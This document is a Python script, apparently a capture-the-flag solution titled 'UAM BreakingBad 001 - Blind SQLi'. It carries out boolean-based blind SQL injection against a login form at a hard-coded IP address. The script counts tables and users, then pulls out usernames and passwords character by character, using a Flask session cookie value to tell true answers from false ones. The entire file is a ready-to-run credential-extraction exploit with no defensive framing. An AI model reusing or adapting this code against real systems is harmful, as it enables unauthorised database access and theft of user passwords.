#!/usr/bin/env python3
from hashlib import sha512
from flask.sessions import session_json_serializer
from itsdangerous import URLSafeTimedSerializer, BadTimeSignature
import base64
import zlib
from cuteprint.cuteprint import PrettyPrinter
import sys
import requests
import urllib3
import string
import urllib
import time
#from tqdm import tqdm
urllib3.disable_warnings()

p = PrettyPrinter()
def getMaxTables():
    p.print_good('MAX TABLES:')

    url='http://34.253.120.147:1730/login'
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    for i in range(0,255):
        username="username=%' OR (SELECT CASE WHEN ((SELECT count(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' )="+str(i)+") THEN '1' ELSE '0' END)='1&password=1234&submit=Login"
        with requests.Session() as s:
            payload='username=%s&password=1234=&submit=Login' % (username)
            r = s.post(url, data = payload, headers = headers, verify = False, allow_redirects = False)
            cookies=s.cookies.get_dict()
            cookie=cookies['session']
            session_payload = cookie.split('.')[0]
            
            if r.status_code == 302 and session_payload=='eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIkluY29ycmVjdCBwYXNzd29yZCBmb3IgdXNlciBQZXBpIl19XX0':
                print("\t\t %s tables found." % (i))
                i += 1
                break

def getMaxUsers():
    p.print_good('MAX USERS:')

    url='http://34.253.120.147:1730/login'
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    for i in range(0,255):
        username="username=%' OR (SELECT CASE WHEN ((SELECT count(username) FROM users)="+str(i)+") THEN '1' ELSE '0' END)='1&password=1234&submit=Login"
        with requests.Session() as s:
            payload='username=%s&password=1234=&submit=Login' % (username)
            r = s.post(url, data = payload, headers = headers, verify = False, allow_redirects = False)
            cookies=s.cookies.get_dict()
            cookie=cookies['session']
            session_payload = cookie.split('.')[0]
            
            if r.status_code == 302 and session_payload=='eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIkluY29ycmVjdCBwYXNzd29yZCBmb3IgdXNlciBQZXBpIl19XX0':
                print("\t\t %s users found." % (i))
                i += 1
                break
    return i

def getUserNames(maxusers=3):
    p.print_good('USERNAMES:')
    users=[]

    url='http://34.253.120.147:1730/login'
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    
    for u in range(0,maxusers-1):
        db_username=''
        p.print_info("User: "+str(u+1))
        i=1
        while i <= 5:
          for c in string.printable:
            if c in ['*','+','.','?','|','&', '$', '\\']:
                c = ''
            username="username=%' OR (SELECT CASE WHEN ((SELECT substr(username,"+str(i)+",1) FROM users ORDER BY username asc LIMIT 1 OFFSET "+str(u)+")='"+c+"') THEN '1' ELSE '0' END)='1&password=1234&submit=Login"
            print("\t\t\t[+] Character:" + c)
            with requests.Session() as s:
                payload='username=%s&password=1234=&submit=Login' % (username)
                r = s.post(url, data = payload, headers = headers, verify = False, allow_redirects = False)
                cookies=s.cookies.get_dict()
                cookie=cookies['session']
                session_payload = cookie.split('.')[0]
                
                if r.status_code == 302 and session_payload=='eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIkluY29ycmVjdCBwYXNzd29yZCBmb3IgdXNlciBQZXBpIl19XX0':
                    p.print_good("Username character found: %s" % (db_username+c))
                    db_username += c
                    i += 1
                    break
        users.append(db_username)
    return users

def getPasswordsHex(users):
    db_username=''
    db_password=''
    #usernames=["Pepi","Luci","Bom"]
    usernames=users
    p.print_info('Usernames to process: [%s]' % ', '.join(map(str, usernames)))
    p.print_good('PASSWORDS:')
    for user in usernames:
        db_username=''
        db_username_array=[]
        p.print_good("USERNAME: "+user)
        print("\t\t",end="",flush=True)
        url='http://34.253.120.147:1730/login'
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        i=1
        while i <= 60:
          #pb_passhex=tqdm(total=60,desc="DB Password")
          for c in range(0,255):
            username="username=%' OR (SELECT CASE WHEN ((SELECT hex(substr(password,"+str(i)+",1)) FROM users WHERE username='"+user+"' ORDER BY username asc LIMIT 1)=printf('%X', "+str(hex(c))+")) THEN '1' ELSE '0' END)='1&password=1234&submit=Login"
            
            with requests.Session() as s:
                payload='username=%s&password=1234=&submit=Login' % (username)
                #print(payload)
                r = s.post(url, data = payload, headers = headers, verify = False, allow_redirects = False)
                cookies=s.cookies.get_dict()
                cookie=cookies['session']
                session_payload = cookie.split('.')[0]
            if r.status_code == 302 and session_payload=='eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIkluY29ycmVjdCBwYXNzd29yZCBmb3IgdXNlciBQZXBpIl19XX0':
                print(chr(int(hex(c),16)), sep='', end='',flush=True)
                #if i  % 10==0:
                #    print("\t"+"["+str(i)+"] Username character found: %s" % (db_username+" "+str(hex(c))))
                db_username += " "+str(hex(c))
                db_username_array.append(str(hex(c)))
                #pb_passhex.update(1.666667)
                i += 1
                if i == 60:
                    p.print_good(" HEX-DECODED PASSWORD:"+''.join(chr(int(char, 16)) for char in db_username_array[1:]))
                break
        #pb_passhex.close()

if __name__ == '__main__':
    p.print_title("UAM BreakingBad 001 - Blind SQLi")
    getMaxTables()
    u=getMaxUsers()
    users=getUserNames(u)
    getPasswordsHex(users)


